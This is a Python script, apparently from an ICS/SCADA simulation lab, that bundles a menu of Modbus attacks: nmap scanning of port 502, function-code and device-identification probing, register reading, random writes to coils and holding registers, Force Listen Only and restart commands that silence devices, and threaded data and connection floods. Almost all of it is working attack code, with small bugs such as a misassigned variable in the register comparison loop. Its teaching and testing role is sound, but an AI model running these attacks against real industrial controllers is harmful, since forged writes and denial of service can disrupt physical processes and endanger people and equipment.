#!/usr/bin/env python3

# FILE:     attacker.py
# PURPOSE:  Provides cyber attacks that can be used to attack any generic ICS/SCADA system. Note
#           that no ICS-specific attacks are generated here. You must implement custom cyber attacks
#           yourself if desired.

import nmap
import random
import time
from threading import Thread, Event
from pymodbus.client import ModbusTcpClient
from pymodbus.pdu.pdu import ExceptionResponse, ModbusPDU
from pymodbus.client.mixin import ModbusClientMixin
from pymodbus.client.base import ModbusBaseClient
from pymodbus.pdu.mei_message import ReadDeviceInformationRequest
from pymodbus.pdu.diag_message import ForceListenOnlyModeRequest, RestartCommunicationsOptionRequest

import pymodbus
print(pymodbus.__version__)

# constants
LOGO = r"""
  ___ ___ ___     ___ _       _         _       ___     _                 _  _   _           _       
 |_ _/ __/ __|___/ __(_)_ __ | |   __ _| |__   / __|  _| |__  ___ _ _    /_\| |_| |_ __ _ __| |__ ___
  | | (__\__ \___\__ \ | '  \| |__/ _` | '_ \ | (_| || | '_ \/ -_) '_|  / _ \  _|  _/ _` / _| / /(_-<
 |___\___|___/   |___/_|_|_|_|____\__,_|_.__/  \___\_, |_.__/\___|_|   /_/ \_\__|\__\__,_\__|_\_\/__/
                                                   |__/                                                                                             
"""

# globals
#scanned_ips = []        # is filled with all modbus ips if the first attacks is executed
#scanned_addresses = {}  # is filled with lists of modbus addresses (key is the ip) 


# CLASS:    CustomModbusRequest
# PURPOSE:  A subclass of the ModbusRequest class. Used to construct
#           custom modbus requests.
class CustomModbusRequest(ModbusPDU):
    def __init__(self, custom_data, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.custom_data = custom_data

    def encode(self):
        # send the raw bytes
        return self.custom_data

    def decode(self, data):
        self.custom_data = data  # parse incoming data



# FUNCTION: create_custom_request
# PURPOSE:  Factory method for creating custom modbus request with specfied function codes.
def create_custom_request(fc):
    class DynamicRequest(CustomModbusRequest):
        pass
    DynamicRequest.function_code = fc
    return DynamicRequest



# FUNCTION: address_scan
# PURPOSE:  Performs an address scan on the given network in CIDR format. The
#           scan identifies hosts running with port 502 open, as this port is used for Modbus
#           TCP communication. Returns all scanned ips in an array.
def address_scan(ip_CIDR):
    #global scanned_ips

    print("### ADDRESS SCAN ###")
    print(f"Performing an nmap ip scan on network {ip_CIDR} on port 502")

    # initialize the nmap scanner
    nm = nmap.PortScanner()

    # scan the ip(s) on modbus port 502
    nm.scan(ip_CIDR, "502", arguments='-T4')
    print(f"Command ran: {nm.command_line()}")

    # print scan results
    scanned_ips = []
    for host in nm.all_hosts():
        print("--------------------------------------------")        
        print(f"Host: {host} ({nm[host].hostname()})")
        print(f"Host State: {nm[host].state()}")
        for proto in nm[host].all_protocols():
            print(f"\tProtocol: {proto}")
            ports = nm[host][proto].keys()
            for port in ports:
                print(f"\tPort: {port}, State: {nm[host][proto][port]['state']}")

                # check if modbus port is open
                if nm[host][proto][port]['state'] == "open":
                    print("\tModbus port 502 is open.")
                    print("It is likely this host is a Modbus Client")
                    scanned_ips.append(nm[host]['addresses']['ipv4'])

    print("### ADDRESS SCAN FINISH ###")
    return scanned_ips



# FUNCTION: function_code_scan
# PURPOSE:  Scans all valid function codes for a list a specified Modbus clients, checking if
#           the function codes work. 
def function_code_scan(ip_addresses):
    publicFC = {1,2,3,4,5,6,7,8,11,12,15,16,17,20,21,22,23,24,43}
    userDefFC = {65,66,67,68,69,70,71,72,100,101,102,103,104,105,106,107,108,109,110}
    reservedFC = {9,10,13,14,41,42,90,91,125,126,127}
    allFc = [publicFC, userDefFC, reservedFC]

    print("### FUNCTION CODE SCAN ###")

    # scan ips (Modbus TCP)
    for ip in ip_addresses:
        print(f"===== Performing a function code scan IP {ip} =====")
        print()
        client = ModbusTcpClient(host=ip, port=502)
    
        for fc_set in allFc:
            if 1 in fc_set:
                print("***Scanning public function codes***")
            elif 65 in fc_set:
                print("***Scanning private function codes***")
            else:
                print("***Scanning reserved function codes***")

            for fc in fc_set:
                # send custom pdu request
                CustomFunctionCode = create_custom_request(fc)
                request = CustomFunctionCode(custom_data=b'\x00\x00\x00\x00')
                
                try:
                    response = client.execute(request=request, no_response_expected=False)
                    if isinstance(response, ExceptionResponse):
                        print(f"Function code {fc} accepted with exception {response.exception_code}")
                    elif response is None:
                        print(f"Function Code {fc}: No response / timeout")
                    else:
                        print(f"Function Code {fc} accepted")
                except Exception as e:
                    #print(e)
                    print(f"Function Code {fc} had an error (rejected)")
        print()
        client.close()
    print("### FUNCTION CODE SCAN FINISH ###")



# FUNCTION: device_identification_attack
# PURPOSE:  Uses function code 0x2B to attempt to find device information.
def device_identification_attack(ip_addresses):
    print("### DEVICE IDENTIFICATION ATTACK ###")

    for ip in ip_addresses:
        print(f"===== Performing device identification on {ip} =====")
        client = ModbusTcpClient(host=ip, port=502)
        request = ReadDeviceInformationRequest(read_code=1)
        response = client.execute(request=request, no_response_expected=False)

        # check if device identification is possible
        if response == None:
            print("Modbus client doesn't support function code 0x2B")
        else:
            # extract data from all object types
            print("*** Basic object type data: ***")
            request = ReadDeviceInformationRequest(read_code=1)
            response = client.execute(request=request, no_response_expected=False)
            for k, v in response.information.items():
                print(f"  {k}: {v}")

            print("*** Regular object type data: ***")
            request = ReadDeviceInformationRequest(read_code=2)
            response = client.execute(request=request, no_response_expected=False)
            for k, v in response.information.items():
                print(f"  {k}: {v}")

            print("*** Extended object type data: ***")
            request = ReadDeviceInformationRequest(read_code=3)
            response = client.execute(request=request, no_response_expected=False)
            for k, v in response.information.items():
                print(f"  {k}: {v}")
        print()
        client.close()
    print("### DEVICE IDENTIFICATION ATTACK FINISH ###")



# FUNCTION: naive_sensor_read
# PURPOSE:  Scans over all registers and coils and attempts for find changing values,
#           which can potentially expose used addresses. Returns all scanned addresses in
#           a dictionary (with the key being the ip)
def naive_sensor_read(ip_addresses):
    print("### NAIVE SENSOR READ ###")

    scanned_addresses = {}
    for ip in ip_addresses:
        print(f"===== Performing naive sensor read on {ip} =====")
        print("Scanning for all registers (coils/di/ir/hr) for 10 seconds")
        print("Attempting to find sensor values")
        print("-------------------------------")

        client = ModbusTcpClient(host=ip, port=502)

        prev_coil = client.read_coils(0, 2000).bits
        prev_di = client.read_discrete_inputs(0, 2000).bits
        prev_ir = client.read_input_registers(0, 125).registers
        prev_hr = client.read_holding_registers(0, 125).registers

        coil_found = []
        di_found = []
        ir_found = []
        hr_found = []

        for _ in range(10):
            time.sleep(1)
            coil = client.read_coils(0, 2000).bits
            di = client.read_discrete_inputs(0, 2000).bits
            ir = client.read_input_registers(0, 125).registers
            hr = client.read_holding_registers(0, 125).registers

            # compare previous response to current response
            for i in range(len(prev_coil)):
                if coil[i] != prev_coil[i] or coil[i] != 0:
                    if i+1 not in coil_found:
                        print(f"Changing coil found at location {i+1} (likely a sensor/actuator value)")
                        coil_found.append(i+1)
            prev_coil = coil
            for i in range(len(prev_di)):
                if di[i] != prev_di[i] or di[i] != 0:
                    if i+1 not in di_found:
                        print(f"Changing discrete input found at location {i+1} (likely a sensor/actuator value)")
                        di_found.append(i+1)
            prev_di = di
            for i in range(len(prev_ir)):
                if ir[i] != prev_ir[i] or ir[i] != 0:
                    if i+1 not in ir_found:
                        print(f"Changing holding register found at location {i+1} (likely a sensor/actuator value)")
                        ir_found.append(i+1)
            prev_coil = coil
            for i in range(len(prev_hr)):
                if hr[i] != prev_hr[i] or hr[i] != 0:
                    if i+1 not in hr_found:
                        print(f"Changing holding register found at location {i+1} (likely a sensor/actuator value)")
                        hr_found.append(i+1)
        print("-------------------------------")
        client.close()

        # add found addresses
        scanned_addresses[ip] = {
            "co": coil_found,
            "di": di_found,
            "ir": ir_found,
            "hr": hr_found
        }

        print(scanned_addresses)

    print("### NAIVE SENSOR READ FINISH ###")
    return scanned_addresses



# FUNCTION: sporadic_sensor_measurement_injection
# PURPOSE:  Writes completely random values to coil/holding registers. 
def sporadic_sensor_measurement_injection(ip_addresses, scanned_addresses=[]):
    print("### SPORADIC SENSOR MEASUREMENT INJECTION ###")

    if len(scanned_addresses) == 0:
        print("Warning: No addresses scanned. Run a sensor read first.")
    
    for ip in ip_addresses:
        print(f"Injecting random data for 10 seconds into {ip}")
        client = ModbusTcpClient(host=ip, port=502)

        if len(scanned_addresses) == 0:
            print("Affecting all addresses randomly")

            # affect coils
            for _ in range(100):
                time.sleep(0.05)
                coil_value = random.choice([True, False])

                address = random.randrange(0, 65535)
                client.write_coil(address, coil_value)

            # affect holding registers
            for _ in range(100):
                time.sleep(0.05)
                hr_value = random.randint(0, 65535)

                address = random.randrange(0, 65535)
                client.write_register(address, hr_value)
            pass
        else:
            co_addresses = scanned_addresses[ip]["co"] 
            hr_addresses = scanned_addresses[ip]["hr"]
            print(f"Affecting found addresses: coils {co_addresses}, holding register {hr_addresses}")

            # affect coils
            for _ in range(100):
                time.sleep(0.05)
                coil_value = random.choice([True, False])

                for address in co_addresses:
                    client.write_coil(address-1, coil_value)

            # affect holding registers
            for _ in range(100):
                time.sleep(0.05)
                hr_value = random.randint(0, 65535)
                for address in hr_addresses:
                    client.write_register(address-1, hr_value)

        
        client.close()
    print("### SPORADIC SENSOR MEASUREMENT INJECTION FINSIH ###")



# FUNCTION: force_listen_mode
# PURPOSE:  Sends function code 0x08 with sub-function code 0x0004
#           to force a device into Force Listen Mode. Devices that accept this
#           function code will stop responding to Modbus requests.
def force_listen_mode(ip_addresses):
    print("### FORCE LISTEN MODE ###")

    for ip in ip_addresses:
        print(f"Forcing device {ip} into Force Listen Only Mode")
        client = ModbusTcpClient(host=ip, port=502)

        # send custom pdu request for a Force Listen Only Mode request)
        # function code 08 with subfunction code 04 (already set)
        request = ForceListenOnlyModeRequest()
        print(request)
        response = client.execute(request=request, no_response_expected=False)
        if not response.isError():
            print("Force listen command was accepted (device may not actually be affected)")
            print(response)
        else:
            print("Force listen command was rejected.")
        time.sleep(1)
        client.close()

    print("### FORCE LISTEN MODE FINISH ###")



# FUNCTION: restart_communication
# PURPOSE:  Sends function code 0x08 with sub-function code 0x0001
#           to restart the device. Do this to cause the device to be constantly
#           inactive.
def restart_communication(ip_addresses):
    print("### RESTART COMMUNICATION ###")

    for ip in ip_addresses:
        print(f"Sending a restart communication request to {ip} in 3 second intervals for 30 seconds")

        client = ModbusTcpClient(host=ip, port=502)
        for _ in range(10):

            # send custom pdu request for a Restart Communcation - function code 08 
            # with subfunction code 01 (device - dependent)
            request = RestartCommunicationsOptionRequest()
            response = client.execute(request=request, no_response_expected=False)
            if not response.isError():
                print("Restart communication command was accepted (device may not actually be affected)")
                print(response)
            else:
                print("Restart communication command was rejected.")
            time.sleep(3)
        client.close()
            
    print("### RESTART COMMUNICATION FINISH ###")



# FUNCTION: data_flood_attack
# PURPOSE:  Floods packets of random modbus read requests to the devices
def data_flood_attack(ip_addresses):
    print("### DATA FLOOD ATTACK ###")

    # helper function to flood packets
    def _flood(ip, stop_looping):

        client = ModbusTcpClient(host=ip, port=502)
        client.connect()
        while not stop_looping.is_set():
            # select random read function code + random address + random num of registers to read
            func_code = random.choice([1, 2, 3, 4])
            address = random.randint(0, 100)
            num_values = random.randint(1, 100)
        
            # Randomly choose some parameters for the request
            if func_code == 1:
                client.read_coils(address=address, count=num_values)
            elif func_code == 2: 
                client.read_discrete_inputs(address=address, count=num_values)
            elif func_code == 3:
                client.read_holding_registers(address=address, count=num_values)
            elif func_code == 4:
                client.read_input_registers(address=address, count=num_values)

    ip = random.choice(ip_addresses)
    print(f"Flooding {ip} with random packets from 10 threads for 15 seconds")

    stop_looping = Event()
    for _ in range(10):
        th_flooder = Thread(target=_flood, args=(ip, stop_looping))
        th_flooder.start()

    time.sleep(15)
    stop_looping.set()

    print("### DATA FLOOD ATTACK FINISH ###")



# FUNCTION: connection_flood_attack
# PURPOSE:  Floods packets with TCP connection requests
def connection_flood_attack(ip_addresses):
    print("### CONNECTION FLOOD ATTACK ###")

    # helper function to flood connection requests
    def _flood_connection(ip, stop_looping):
        while not stop_looping.is_set():
            client = ModbusTcpClient(host=ip, port=502)
            client.connect()
            time.sleep(0.01)
            client.close()

    ip = random.choice(ip_addresses)
    print(f"Flooding {ip} with connection requests from 10 threads for 15 seconds")

    stop_looping = Event()
    for _ in range(10):
        th_flooder = Thread(target=_flood_connection, args=(ip, stop_looping))
        th_flooder.start()

    time.sleep(15)
    stop_looping.set()

    print("### CONNECTION FLOOD ATTACK FINISH ###")



# Main function
if __name__ == "__main__":
    print(LOGO)

    menuPrompt = """
-----------------------------------------------------------------
| Please select an attack to run against the ICS simulation:    |
|                                                               |
|    Reconnaissance Attacks                                     |
|    (1) - address scan                                         |
|    (2) - function code scan                                   |
|    (3) - device identification attack                         |
|                                                               |
|    Response and Measurement Injection Attacks                 |
|    (4) - naive sensor read                                    |
|    (5) - sporadic sensor measurement injection                |
|                                                               |
|    Command Injection Attacks                                  |
|    (6) - force listen mode                                    |
|    (7) - restart communication                                |
|                                                               |
|    Denial of Service Attacks                                  |
|    (8) - data flood attack                                    |
|    (9) - connection flood attack                              |
|                                                               |
|    (0) - quit                                                 |
-----------------------------------------------------------------

"""

    selection = -1
    scanned_ips = []
    scanned_addresses = {}
    while selection != 0:
        selection = -1
        # get user input (only as int)
        try:
            while selection == -1:
                selection = int(input(menuPrompt))
        except ValueError:
            pass

        # check if any ips have been scanned
        if len(scanned_ips) == 0:
            print("Warning: No IPs scanned. Run an address scan to find Modbus clients")

        # perform cyber attack
        if selection == 1:
            scanned_ips = address_scan("192.168.0.0/24")
        elif selection == 2:
            function_code_scan(scanned_ips)
        elif selection == 3:
            device_identification_attack(scanned_ips)
        elif selection == 4:
            scanned_addresses = naive_sensor_read(scanned_ips)
        elif selection == 5:
            sporadic_sensor_measurement_injection(scanned_ips, scanned_addresses=scanned_addresses)
        #elif selection == 5:
        #    calculated_sensor_measure_injection(scanned_ips)
        #elif selection == 6:
        #    replayed_measurement_injection(scanned_ips)
        #elif selection == 7:
        #    altered_actuator_state(scanned_ips)
        #elif selection == 8:
        #    altered_control_set_points(scanned_ips)
        elif selection == 6:
            force_listen_mode(scanned_ips)
        elif selection == 7:
            restart_communication(scanned_ips)
        elif selection == 8:
            data_flood_attack(scanned_ips)
        elif selection == 9:
            connection_flood_attack(scanned_ips)